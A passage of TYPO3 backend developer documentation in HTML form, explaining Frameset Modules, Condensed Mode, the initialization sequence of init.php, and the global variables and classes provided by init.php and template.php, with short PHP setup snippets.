<P CLASS="western">A Frameset Module consists of these scripts:</P>
<OL>
	<LI><P CLASS="western">alt_mod_frameset.php: The frameset is
	constructed by this script for <I>all frameset modules</I>. This
	script will receive information about the scripts to load in the
	frames inside.</P>
	<LI><P CLASS="western">[<I>frameset module specific script name</I>]:
	Navigation script as specified in the module configuration of the
	Frameset Module. (JS reference: top.content.nav_frame)</P>
	<LI><P CLASS="western">border.html: A simple vertical bar separating
	the two main frames. (JS reference: top.content.border_frame)</P>
	<LI><P CLASS="western">[<I>module specific script name</I>]:
	Sub-module script as specified in the module configuration of the
	sub-module. (JS reference: top.content.list_frame)</P>
</OL>
<P CLASS="western">Certain requirements are put on the function of
the navigation and sub-module scripts in order to ensure complete
compatibility with the concept of Frameset Modules. This is basically
about updating some JavaScript variables in the main frameset. See
the module section for more details.</P>
<H4 CLASS="western">Condensed Mode</H4>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_5902ef83.png" NAME="Graphic28" ALIGN=LEFT WIDTH=381 HEIGHT=48 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western">If Condensed Mode is enabled for the user it has
an impact on how Frameset Modules handles the splitting of the screen
into navigation and list frame. Basically the frameset is not used
and the communication goes always from menu -&gt; navigation frame -&gt;
list frame:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_m34efa17b.png" NAME="Graphic29" ALIGN=LEFT WIDTH=557 HEIGHT=271 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western">This mode is designed to help people with small
screen resolutions to keep all the information on the screen without
having to scroll horizontally (too much). In default mode TYPO3 runs
best at resolutions of 1024x768 or above.</P>
<H3 CLASS="western"><A NAME="2.1.1.Initialization (init.php)|outline"></A>
Initialization (init.php)</H3>
<H4 CLASS="western">Scripts in TYPO3_mainDir</H4>
<P CLASS="western">Each script in the backend is <I>required</I> to
include the init.php file. For core scripts this is done as the first
code line in the script:</P>
<PRE CLASS="western">require ('init.php');</PRE><P CLASS="western">
<BR><BR>
</P>
<P CLASS="western">An example could be the alt_main.php script (the
backend frameset):</P>
<PRE CLASS="western"><CODE CLASS="western"><FONT COLOR="#ff8000">/** <BR>* Main frameset of the TYPO3 backend<BR>* <BR>* @author&nbsp;&nbsp;&nbsp;&nbsp;Kasper Skårhøj &lt;kasper@typo3.com&gt;<BR>* Revised for TYPO3 3.6 2/2003 by Kasper Skårhøj<BR>*/<BR><BR></FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">require (</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'init.php'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">);<BR>require (</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'template.php'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">);<BR>require_once (</FONT></CODE><CODE CLASS="western"><FONT COLOR="#0000bb">PATH_t3lib</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">.</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'class.t3lib_loadmodules.php'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">);<BR>require_once (</FONT></CODE><CODE CLASS="western"><FONT COLOR="#0000bb">PATH_t3lib</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">.</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'class.t3lib_basicfilefunc.php'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">);<BR>require_once (</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'class.alt_menu_functions.inc'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">);<BR><BR><BR><BR></FONT></CODE><CODE CLASS="western"><FONT COLOR="#ff8000">// ***************************<BR>// Script Class<BR>// ***************************<BR></FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">class </FONT></CODE><CODE CLASS="western"><FONT COLOR="#0000bb">SC_alt_main </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">{<BR>&nbsp;&nbsp;&nbsp;&nbsp;var </FONT></CODE><CODE CLASS="western"><FONT COLOR="#0000bb">$content</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">;<BR>&nbsp;&nbsp;&nbsp;&nbsp;var </FONT></CODE><CODE CLASS="western"><FONT COLOR="#0000bb">$mainJScode</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">;<BR>&nbsp;&nbsp;&nbsp;&nbsp;var </FONT></CODE><CODE CLASS="western"><FONT COLOR="#0000bb">$loadModules</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">;<BR>&nbsp;&nbsp;&nbsp;&nbsp;var </FONT></CODE><CODE CLASS="western"><FONT COLOR="#0000bb">$alt_menuObj</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">;</FONT></CODE>
</PRE><P CLASS="western">
These are comments on the various parts of the above source code:</P>
<UL>
	<LI><P CLASS="western"><B>init.php:</B> Included to provide database
	access, configuration values, class inclusions and user
	authentication etc.</P>
	<LI><P CLASS="western"><B>template.php:</B> As you can see also the
	template.php script is included (which provides a class for backend
	HTML-output and processing of system languages/labels). The
	template.php script is typically included by all scripts which has
	some HTML-output for the backend interface.</P>
	<LI><P CLASS="western"><B>Other classes:</B> Then further classes
	needed by the script depending on the function will be included. 
	</P>
	<LI><P CLASS="western"><B>Script Class:</B> Then a &quot;script-class&quot;
	(prefixed SC_) is defined. This performs ALL processing done in the
	script. In the end of the script this class is instantiated and the
	output is written to the browser. That's it.</P>
</UL>
<H4 CLASS="western">Scripts outside of TYPO3_mainDir</H4>
<P CLASS="western">For modules (located elsewhere than in the
TYPO3_mainDir) the following initialization must be done <I>prior to
inclusion</I> of init.php:</P>
<UL>
	<LI><P CLASS="western"><B>Global variable $BACK_PATH</B> must <I>point
	back</I> to the TYPO3_mainDir (relative from the current script),
	eg. &quot;../../&quot; or &quot;../../../typo3/&quot;</P>
	<LI><P CLASS="western"><B>Constant TYPO3_MOD_PATH</B> must <I>point
	forth</I> to the location of the script (relative <I>from</I> the
	TYPO3_mainDir), eg. &quot;ext/myextension/&quot; or
	&quot;../typo3conf/ext/myextension/&quot;</P>
	<P CLASS="western"></P>
</UL>
<P CLASS="western">An example is seen in the install/index.php file:</P>
<PRE CLASS="western"><FONT COLOR="#000000"><FONT COLOR="#0000bb">define</FONT><FONT COLOR="#007700">(</FONT><FONT COLOR="#dd0000">'TYPO3_MOD_PATH'</FONT><FONT COLOR="#007700">, </FONT><FONT COLOR="#dd0000">'install/'</FONT><FONT COLOR="#007700">);</FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#0000bb">$BACK_PATH</FONT><FONT COLOR="#007700">=</FONT><FONT COLOR="#dd0000">'../'</FONT><FONT COLOR="#007700">;</FONT></FONT>

<FONT COLOR="#007700">require (</FONT><FONT COLOR="#0000bb">$BACK_PATH</FONT><FONT COLOR="#007700">.</FONT><FONT COLOR="#dd0000">'init.php'</FONT><FONT COLOR="#007700">);</FONT></PRE><P CLASS="western">
If a script is positioned outside of the TYPO3_mainDir it must be in
the typo3conf/ directory. In that case the initial lines could look
like this:</P>
<PRE CLASS="western"><FONT COLOR="#000000"><FONT COLOR="#0000bb">define</FONT><FONT COLOR="#007700">(</FONT><FONT COLOR="#dd0000">'TYPO3_MOD_PATH'</FONT><FONT COLOR="#007700">, </FONT><FONT COLOR="#dd0000">'../typo3conf/my_backend_script/'</FONT><FONT COLOR="#007700">);</FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#0000bb">$BACK_PATH</FONT><FONT COLOR="#007700">=</FONT><FONT COLOR="#dd0000">'../../typo3/'</FONT><FONT COLOR="#007700">;</FONT></FONT>

<FONT COLOR="#007700">require (</FONT><FONT COLOR="#0000bb">$BACK_PATH</FONT><FONT COLOR="#007700">.</FONT><FONT COLOR="#dd0000">'init.php'</FONT><FONT COLOR="#007700">);</FONT></PRE><P CLASS="western">
<B>Modules</B></P>
<P CLASS="western" STYLE="font-weight: normal">Modules will typically
initiate with basic lines like these:</P>
<PRE CLASS="western"><FONT COLOR="#000000"><FONT COLOR="#007700">unset(</FONT><FONT COLOR="#0000bb">$MCONF</FONT><FONT COLOR="#007700">);</FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#007700">require (</FONT><FONT COLOR="#dd0000">'conf.php'</FONT><FONT COLOR="#007700">);</FONT></FONT>
<FONT COLOR="#007700">require (</FONT><FONT COLOR="#0000bb">$BACK_PATH</FONT><FONT COLOR="#007700">.</FONT><FONT COLOR="#dd0000">'init.php'</FONT><FONT COLOR="#007700">);</FONT></PRE><P CLASS="western">
So before init.php is called the local &quot;conf.php&quot; file is
included. That file must define the TYPO3_MOD_PATH constant and
$BACK_PATH global variable. The modules section will describe this in
detail. 
</P>
<P CLASS="western">We could take mod/web/perms/index.php as an
example. Here the conf.php file looks like this:</P>
<PRE CLASS="western"><CODE CLASS="western"><FONT COLOR="#0000bb">&lt;?php<BR>define</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">('</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">TYPO3_MOD_PATH'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">, '</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">mod/web/perm/'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">);<BR></FONT></CODE><CODE CLASS="western"><FONT COLOR="#0000bb">$BACK_PATH</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'../../../'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">;<BR><BR>//... (additional configuration of module)...</FONT></CODE>
<CODE CLASS="western"><FONT COLOR="#0000bb">?&gt;</FONT></CODE></PRE><P CLASS="western">
<BR><BR>
</P>
<P CLASS="western"><B>Modules in typo3conf/</B></P>
<P CLASS="western">Another example is from a conf.php file of a
locally installed extension (such are located in the &quot;typo3conf/ext/&quot;
directory) with a backend module:</P>
<PRE CLASS="western"><CODE CLASS="western"><FONT COLOR="#0000bb">&lt;?php<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#ff8000">// DO NOT REMOVE OR CHANGE THESE 3 LINES:<BR></FONT></CODE><CODE CLASS="western"><FONT COLOR="#0000bb">define</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">(</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'TYPO3_MOD_PATH'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">, </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'../typo3conf/ext/charsettool/mod1/'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">);<BR></FONT></CODE><CODE CLASS="western"><FONT COLOR="#0000bb">$BACK_PATH</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'../../../../typo3/'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">;<BR></FONT></CODE>
<CODE CLASS="western"><FONT COLOR="#007700">//... (additional configuration of module)...</FONT></CODE>
<CODE CLASS="western"><FONT COLOR="#0000bb">?&gt;</FONT></CODE></PRE><P CLASS="western">
<BR><BR>
</P>
<H4 CLASS="western">init.php</H4>
<P CLASS="western">So what happens in init.php?</P>
<P CLASS="western"><B>The short version is this:</B></P>
<UL>
	<LI><P CLASS="western">A set of constants and global variables are
	defined.</P>
	<LI><P CLASS="western">A set of classes are included.</P>
	<LI><P CLASS="western">PHP environment is checked and set.</P>
	<LI><P CLASS="western">Local configuration is included
	(&quot;localconf.php&quot;).</P>
	<LI><P CLASS="western">Table definitions are set (&quot;tables.php&quot;).</P>
	<LI><P CLASS="western">Connection to database established.</P>
	<LI><P CLASS="western">Backend user is authenticated.</P>
	<LI><P CLASS="western">Missing backend user authentication and other
	errors will make the script exit with an error message.</P>
</UL>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><B>The verbose version is this:</B></P>
<P CLASS="western">(All global variables and constants referred to
here are described in &quot;<A HREF="#Variables%20and%20Constants%7Coutline">TYPO3
Core API</A>&quot;)</P>
<UL>
	<LI><P CLASS="western">Error reporting is set to 
	</P>
	<PRE CLASS="western">error_reporting (E_ALL ^ E_NOTICE); 
</PRE>
	<LI><P CLASS="western">Constants TYPO3_OS, TYPO3_MODE,
	PATH_thisScript and TYPO3_mainDir are defined.</P>
	<LI><P CLASS="western">If TYPO3_MOD_PATH is defined the path is
	evaluated: The script must be found below either TYPO3_mainDir or
	PATH_site.&quot;typo3conf/&quot;. Otherwise the init.php script
	halts with an error message. Further the script will exit at this
	point if it was not able to get a correct absolute path for the
	installation. TYPO3 <I>requires</I> to know the absolute position of
	the directory from where the script is executed!</P>
	<LI><P CLASS="western">Constants  PATH_typo3, PATH_typo3_mod,
	PATH_site, PATH_t3lib, PATH_typo3conf are defined.</P>
	<LI><P CLASS="western">Classes t3lib_div and t3lib_extMgm are
	included.</P>
	<LI><P CLASS="western">t3lib/config_default.php is included (shared
	with frontend as well). If no TYPO3_db constant is defined after the
	inclusion of config_default.php then the script exits with an error
	message.<BR>This is what happens inside config_default.php:</P>
	<UL>
		<H4 CLASS="western">t3lib/config_default.php:</H4>
		<LI><P CLASS="western">$TYPO3_CONF_VARS is initialized with the
		default set of values.</P>
		<LI><P CLASS="western">$typo_db* database variables are reset to
		blank.</P>
		<LI><P CLASS="western">PATH_typo3conf.'localconf.php' is included.
		If not found, script exits with error message.</P>
		<UL>
			<H4 CLASS="western">localconf.php:</H4>
			<LI><P CLASS="western">localconf.php is allowed to override any
			variable from $TYPO3_CONF_VARS and further set the database
			variables with database username, password, database name, host.</P>
		</UL>
		<P CLASS="western"><BR>[Back in t3lib_config_default.php]:</P>
		<LI><P CLASS="western">Constants TYPO3_db, TYPO3_db_username,
		TYPO3_db_password, TYPO3_db_host, TYPO3_tables_script,
		TYPO3_extTableDef_script and TYPO3_languages is defined</P>
		<LI><P CLASS="western">$typo_db* variables are unset.</P>
		<LI><P CLASS="western">Certain $GLOBALS['TYPO3_CONF_VARS']['GFX']
		values are manipulated.</P>
		<LI><P CLASS="western">debug() function is defined (only function
		outside a class!)</P>
		<LI><P CLASS="western">&quot;ext_localconf.php&quot; files from
		installed extensions are included either as a cached file (ex.
		&quot;typo3conf/temp_CACHED_ps5cb2_ext_localconf.php&quot;) or as
		individual files (depends on configuration of
		TYPO3_CONF_VARS['EXT']['extCache'].<BR>&quot;ext_localconf.php&quot;
		files are allowed to override $TYPO3_CONF_VARS values! They cannot
		modify the database connection information though. (See the
		definition of the Extension API for details)<BR>$TYPO3_LOADED_EXT
		is set.</P>
		<LI><P CLASS="western">Unsetting most of the reserved global
		variables ($PAGES_TYPES, $ICON_TYPES, $LANG_GENERAL_LABELS, $TCA,
		$TBE_MODULES, $TBE_STYLES, $FILEICONS, $WEBMOUNTS, $FILEMOUNTS,
		$BE_USER, $TBE_MODULES_EXT, $TCA_DESCR, $TCA_DESCR, $LOCAL_LANG)
		except $TYPO3_CONF_VARS (so from localconf.php files you cannot set
		values in these variables - you must use &quot;tables.php&quot;
		files).</P>
		<LI><P CLASS="western">Global vars $EXEC_TIME, $SIM_EXEC_TIME and
		$TYPO_VERSION are set</P>
	</UL>
	<P CLASS="western"><BR>[Back in init.php]:</P>
	<LI><P CLASS="western">Database Abstraction Layer foundation class
	is included and global object, $TYPO3_DB, is created.</P>
	<LI><P CLASS="western">Global vars $CLIENT and $PARSETIME_START are
	set.</P>
	<LI><P CLASS="western">Classes for user authentication are included
	plus class for icon manipulation and the t3lib_BEfunc (backend
	functions) class. Also the class &quot;t3lib_cs&quot; for character
	set conversion is included.</P>
	<LI><P CLASS="western">IP masking is performed (based on
	$TYPO3_CONF_VARS['BE']['IPmaskList']). Exits if criterias are not
	met.</P>
	<LI><P CLASS="western">SSL locking is checked
	($TYPO3_CONF_VARS['BE']['lockSSL']).  Exits if criterias are not
	met.</P>
	<LI><P CLASS="western">Checking PHP environment. Exits if PHP
	version is not supported or if HTTP_GET_VARS[GLOBALS] is set.</P>
	<LI><P CLASS="western">Checking for Install Tool call: If constant
	TYPO3_enterInstallScript is set, then the Install Tool is launched!
	Notice that the Install Tool is launched before any <I>connection</I>
	is made to the database! Thus the Install Tool will run even if the
	database configuration is not complete or existing.</P>
	<LI><P CLASS="western">Database connection. Exits if database
	connection fails.</P>
	<LI><P CLASS="western">Checking browser. Must be 4+ browser. Exits
	if criterias are not met.</P>
	<LI><P CLASS="western">Default tables are defined;
	PATH_t3lib.'stddb/tables.php' is included! (Alternatively the
	constant TYPO3_tables_script could have defined another filename
	relative to &quot;PATH_typo3conf&quot; which will be included
	instead. Deprecated since it spoils backwards compatibility and
	extensions should be used to override the default $TCA instead. So
	consider this obsolete.)</P>
	<UL>
		<H4 CLASS="western">t3lib/stddb/tables.php:</H4>
		<LI><P CLASS="western">global variables $PAGES_TYPES, $ICON_TYPES,
		$LANG_GENERAL_LABELS, $TCA, $TBE_MODULES, $TBE_STYLES, $FILEICONS
		are defined.</P>
	</UL>
	<P CLASS="western"></P>
	<P CLASS="western">[Back in init.php]</P>
	<LI><P CLASS="western">&quot;ext_tables.php&quot; files are included
	either as a cached file (ex.
	&quot;typo3conf/temp_CACHED_ps5cb2_ext_tables.php&quot;) or as
	individual files (depends on configuration of
	TYPO3_CONF_VARS['EXT']['extCache']).<BR>&quot;ext_tables.php&quot;
	files are allowed to override the global variables defined in
	&quot;stddb/tables.php&quot;! (See the definition of the Extension
	API for details)</P>
	<LI><P CLASS="western">If the constant TYPO3_extTableDef_script is
	defined then that script is included.</P>
	<LI><P CLASS="western">Backend user authenticated: Global variable
	$BE_USER is instantiated and initialized. If no backend user is
	authenticated the script will exit (UNLESS the constant
	TYPO3_PROCEED_IF_NO_USER has been defined and set true prior to
	inclusion of init.php!)</P>
	<LI><P CLASS="western">The global variables $WEBMOUNTS and
	$FILEMOUNTS are set (based on the BE_USERS permissions)</P>
	<LI><P CLASS="western">Optional output compression initialized</P>
</UL>
<P CLASS="western">So that is what happens in init.php!</P>
<H3 CLASS="western"><A NAME="2.1.2.Global variables, Constants and Classes|outline"></A>
Global variables, Constants and Classes</H3>
<P CLASS="western">After init.php has been included there is a set of
variables, constants and classes available to the parent script. In
the document &quot;TYPO3 Core API&quot; you can see <A HREF="#Variables%20and%20Constants%7Coutline">two
tables listing these constants and variables</A>.</P>
<P CLASS="western">The column &quot;Avail. in FE&quot; is an
indicator that tells you if the constant, variable or class mentioned
is also available to scripts running under the frontend of the &quot;cms&quot;
extension. Strictly this is not a part of the core (which is what we
deal with in this document), but since the &quot;cms&quot; extension
is practically always a part of a TYPO3 setup it's included here as a
service to you.</P>
<H4 CLASS="western">Classes</H4>
<P CLASS="western">This is the classes already included after having
included &quot;init.php&quot;:</P>
<TABLE WIDTH=100% BORDER=1 BORDERCOLOR="#000000" CELLPADDING=4 CELLSPACING=0>
	<COL WIDTH=47*>
	<COL WIDTH=32*>
	<COL WIDTH=150*>
	<COL WIDTH=27*>
	<THEAD>
		<TR VALIGN=TOP>
			<TH WIDTH=18%>
				<P CLASS="western">Class</P>
			</TH>
			<TH WIDTH=13%>
				<P CLASS="western">Included in</P>
			</TH>
			<TH WIDTH=58%>
				<P CLASS="western">Description</P>
			</TH>
			<TH WIDTH=11%>
				<P CLASS="western">Avail. in FE</P>
			</TH>
		</TR>
	</THEAD>
	<TBODY>
		<TR VALIGN=TOP>
			<TD WIDTH=18%>
				<P CLASS="western">t3lib_div</P>
			</TD>
			<TD WIDTH=13%>
				<P CLASS="western">init.php</P>
			</TD>
			<TD WIDTH=58%>
				<P CLASS="western"><BR>
				</P>
			</TD>
			<TD WIDTH=11%>
				<P CLASS="western" ALIGN=CENTER>YES</P>
			</TD>
		</TR>
		<TR VALIGN=TOP>
			<TD WIDTH=18%>
				<P CLASS="western">t3lib_extMgm</P>
			</TD>
			<TD WIDTH=13%>
				<P CLASS="western">init.php</P>
			</TD>
			<TD WIDTH=58%>
				<P CLASS="western"><BR>
				</P>
			</TD>
			<TD WIDTH=11%>
				<P CLASS="western" ALIGN=CENTER>YES</P>
			</TD>
		</TR>
		<TR VALIGN=TOP>
			<TD WIDTH=18%>
				<P CLASS="western">t3lib_db</P>
			</TD>
			<TD WIDTH=13%>
				<P CLASS="western">init.php</P>
			</TD>
			<TD WIDTH=58%>
				<P CLASS="western"><BR>
				</P>
			</TD>
			<TD WIDTH=11%>
				<P CLASS="western" ALIGN=CENTER>YES</P>
			</TD>
		</TR>
		<TR VALIGN=TOP>
			<TD WIDTH=18%>
				<P CLASS="western">t3lib_userauth</P>
			</TD>
			<TD WIDTH=13%>
				<P CLASS="western">init.php</P>
			</TD>
			<TD WIDTH=58%>
				<P CLASS="western"><BR>
				</P>
			</TD>
			<TD WIDTH=11%>
				<P CLASS="western" ALIGN=CENTER>YES</P>
			</TD>
		</TR>
		<TR VALIGN=TOP>
			<TD WIDTH=18%>
				<P CLASS="western">t3lib_userauthgroup</P>
			</TD>
			<TD WIDTH=13%>
				<P CLASS="western">init.php</P>
			</TD>
			<TD WIDTH=58%>
				<P CLASS="western"><BR>
				</P>
			</TD>
			<TD WIDTH=11%>
				<P CLASS="western" ALIGN=CENTER>-</P>
			</TD>
		</TR>
		<TR VALIGN=TOP>
			<TD WIDTH=18%>
				<P CLASS="western">t3lib_beuserauth</P>
			</TD>
			<TD WIDTH=13%>
				<P CLASS="western">init.php</P>
			</TD>
			<TD WIDTH=58%>
				<P CLASS="western"><BR>
				</P>
			</TD>
			<TD WIDTH=11%>
				<P CLASS="western" ALIGN=CENTER>-</P>
			</TD>
		</TR>
		<TR VALIGN=TOP>
			<TD WIDTH=18%>
				<P CLASS="western">t3lib_iconworks</P>
			</TD>
			<TD WIDTH=13%>
				<P CLASS="western">init.php</P>
			</TD>
			<TD WIDTH=58%>
				<P CLASS="western"><BR>
				</P>
			</TD>
			<TD WIDTH=11%>
				<P CLASS="western" ALIGN=CENTER>-</P>
			</TD>
		</TR>
		<TR VALIGN=TOP>
			<TD WIDTH=18%>
				<P CLASS="western">t3lib_befunc</P>
			</TD>
			<TD WIDTH=13%>
				<P CLASS="western">init.php</P>
			</TD>
			<TD WIDTH=58%>
				<P CLASS="western"><BR>
				</P>
			</TD>
			<TD WIDTH=11%>
				<P CLASS="western" ALIGN=CENTER>-</P>
			</TD>
		</TR>
		<TR VALIGN=TOP>
			<TD WIDTH=18%>
				<P CLASS="western">t3lib_cs</P>
			</TD>
			<TD WIDTH=13%>
				<P CLASS="western">init.php</P>
			</TD>
			<TD WIDTH=58%>
				<P CLASS="western"><BR>
				</P>
			</TD>
			<TD WIDTH=11%>
				<P CLASS="western" ALIGN=CENTER>YES</P>
			</TD>
		</TR>
		<TR VALIGN=TOP>
			<TD WIDTH=18%>
				<P CLASS="western"><I>gzip_encode</I></P>
			</TD>
			<TD WIDTH=13%>
				<P CLASS="western">init.php</P>
			</TD>
			<TD WIDTH=58%>
				<P CLASS="western">Output compression class by Sandy McArthur,
				Jr. Included if option is set in TYPO3_CONF_VARS.</P>
			</TD>
			<TD WIDTH=11%>
				<P CLASS="western" ALIGN=CENTER>(YES)</P>
			</TD>
		</TR>
	</TBODY>
</TABLE>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western">Possibly other classes could have been included in
&quot;ext_tables.php&quot; files or &quot;ext_localconf.php&quot;
files. This is OK for the &quot;localconf.php&quot; file, but not
necessarily for extensions. Please see the Extension API description
for guidelines on this.</P>
<H4 CLASS="western">System/PHP Variables</H4>
<P CLASS="western">A short notice on system variables:</P>
<P CLASS="western">Don't use any system-global vars, except these:</P>
<PRE CLASS="western">HTTP_GET_VARS, HTTP_POST_VARS, HTTP_COOKIE_VARS</PRE><P CLASS="western">
<BR><BR>
</P>
<P CLASS="western">Any other variables may not be accessible if
php.ini-optimized is used!</P>
<P CLASS="western"><B>Environment / Server variables</B> are also
very critical! Since different servers and platforms offer different
values in the environment and server variables, TYPO3 features an
abstraction function you should always use if you need to get the
REQUEST_URI, HTTP_HOST or something like that. At least never use the
PHP function &quot;getenv()&quot; or take the values directly from
HTTP_SERVER_VARS - rather call
t3lib_div::getIndpEnv(&quot;<I>name_of_sys_variable</I>&quot;) to get
the value (if it is supported by that function). You can rely on that
function will deliver a consistent value independently of the server
OS and webserver software.</P>
<P CLASS="western">You should refer to the <A HREF="/home/shafiq/Sites/typo3/doc_core_cgl/doc/manual.sxw">TYPO3
Coding Guidelines</A> or <A HREF="#High%20priority%20functions%20(CGL%20requirements)%7Coutline">TYPO3
Core API</A> for more information about this or go directly to the
source of class.t3lib_div.php.</P>
<H3 CLASS="western"><A NAME="2.1.3.The template class (template.php)|outline"></A>
The template class (template.php)</H3>
<P CLASS="western">Most backend scripts include another core script
than &quot;init.php&quot;. That is &quot;template.php&quot;.</P>
<PRE CLASS="western"><FONT COLOR="#000000"><FONT COLOR="#007700">require (</FONT><FONT COLOR="#dd0000">'init.php'</FONT><FONT COLOR="#007700">);</FONT></FONT>
<FONT COLOR="#007700">require (</FONT><FONT COLOR="#dd0000">'template.php'</FONT><FONT COLOR="#007700">);</FONT></PRE><P CLASS="western">
&quot;template.php&quot; contains a class &quot;template&quot;. This
class is used to output HTML-header, footer and page content in the
backend.</P>
<P CLASS="western">template.php does this:</P>
<UL>
	<LI><P CLASS="western">Initially an obsolete function, fw($str), is
	defined. This just returns the input string un-altered. May be
	removed in the future as it's obsolete and here for backwards
	compatibility only. If you use this function in your modules, then
	stop doing that!</P>
	<LI><P CLASS="western">Defines the class &quot;template&quot; which
	contains the HTML output related methods for creating backend
	documents.</P>
	<LI><P CLASS="western">Defines four extension classes of the
	template class: bigDoc, noDoc, smallDoc, mediumDoc. Each of them
	presets a certain width of the outputted page by specifying a class
	for a wrapping DIV-tag.</P>
	<LI><P CLASS="western">Includes sysext/lang/lang.php which contains
	the class &quot;language&quot; for management of localized labels in
	the backend. It also contains an instance of the character set
	conversion class, &quot;t3lib_cs&quot;.</P>
	<LI><P CLASS="western">Creates the global variables $TBE_TEMPLATE
	and $LANG as instances of the classes &quot;template&quot; and
	&quot;language&quot; respectively.</P>
</UL>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western">&quot;template.php&quot; requires init.php to have
been included on beforehand.</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western">This is the variables and classes available in
addition after inclusion of &quot;template.php&quot;:</P>
<H4 CLASS="western">Variables</H4>
<TABLE WIDTH=100% BORDER=1 BORDERCOLOR="#000000" CELLPADDING=4 CELLSPACING=0>
	<COL WIDTH=52*>
	<COL WIDTH=45*>
	<COL WIDTH=130*>
	<COL WIDTH=30*>
	<THEAD>
		<TR VALIGN=TOP>
			<TH WIDTH=20%>
				<P CLASS="western">Global variable</P>
			</TH>
			<TH WIDTH=17%>
				<P CLASS="western">Defined in</P>
			</TH>
			<TH WIDTH=51%>
				<P CLASS="western">Description</P>
			</TH>
			<TH WIDTH=12%>
				<P CLASS="western">Avail. in FE</P>
			</TH>
		</TR>
	</THEAD>
	<TBODY>
		<TR VALIGN=TOP>
			<TD WIDTH=20%>
				<P CLASS="western" STYLE="font-style: normal">$TBE_TEMPLATE</P>
			</TD>
			<TD WIDTH=17%>
				<P CLASS="western">template.php</P>
			</TD>
			<TD WIDTH=51%>
				<P CLASS="western">Global backend template object for HTML-output
				in backend modules</P>
			</TD>
			<TD WIDTH=12%>
				<P CLASS="western" ALIGN=CENTER><BR>
				</P>
			</TD>
		</TR>
		<TR VALIGN=TOP>
			<TD WIDTH=20%>
				<P CLASS="western" STYLE="font-style: normal">$LANG</P>
			</TD>
			<TD WIDTH=17%>
				<P CLASS="western">template.php</P>
			</TD>
			<TD WIDTH=51%>
				<P CLASS="western">Localization object which returns the correct
				localized labels for various parts in the backend. 
				</P>
				<P CLASS="western">It also contains an instance of the &quot;t3lib_cs&quot;
				class in $LANG-&gt;csConvObj</P>
			</TD>
			<TD WIDTH=12%>
				<P CLASS="western" ALIGN=CENTER><BR>
				</P>
			</TD>
		</TR>
		<TR VALIGN=TOP>
			<TD WIDTH=20%>
				<P CLASS="western"><I>$LOCAL_LANG</I></P>
			</TD>
			<TD WIDTH=17%>
				<P CLASS="western">Optionally included &quot;locallang&quot;
				file.</P>
			</TD>
			<TD WIDTH=51%>
				<P CLASS="western">Stores language specific labels and messages.
				Requires a &quot;local_lang&quot; file to have been included in
				the global space.</P>
				<P CLASS="western"><BR>
				</P>
				<P CLASS="western"><B>Notice:</B> This variable is unset in
				&quot;config_default .php&quot; for your convenience. So don't
				set the $LOCAL_LANG array prior to &quot;init.php&quot;.</P>
			</TD>
			<TD WIDTH=12%>
				<P CLASS="western" ALIGN=CENTER>-</P>
			</TD>
		</TR>
		<TR VALIGN=TOP>
			<TD WIDTH=20%>
				<P CLASS="western"><I>$TCA_DESCR</I></P>
			</TD>
			<TD WIDTH=17%>
				<P CLASS="western">[on-the-fly]</P>
			</TD>
			<TD WIDTH=51%>
				<P CLASS="western">Could be set to contain help descriptions for
				fields and modules.  Is set by API function in the &quot;language&quot;
				class. 
				</P>
				<P CLASS="western">Unset in &quot;config_default.php&quot;</P>
			</TD>
			<TD WIDTH=12%>
				<P CLASS="western" ALIGN=CENTER><BR>
				</P>
			</TD>
		</TR>
	</TBODY>
</TABLE>
<H4 CLASS="western">Classes</H4>
<TABLE WIDTH=100% BORDER=1 BORDERCOLOR="#000000" CELLPADDING=4 CELLSPACING=0>
	<COL WIDTH=52*>
	<COL WIDTH=45*>
	<COL WIDTH=130*>
	<COL WIDTH=30*>
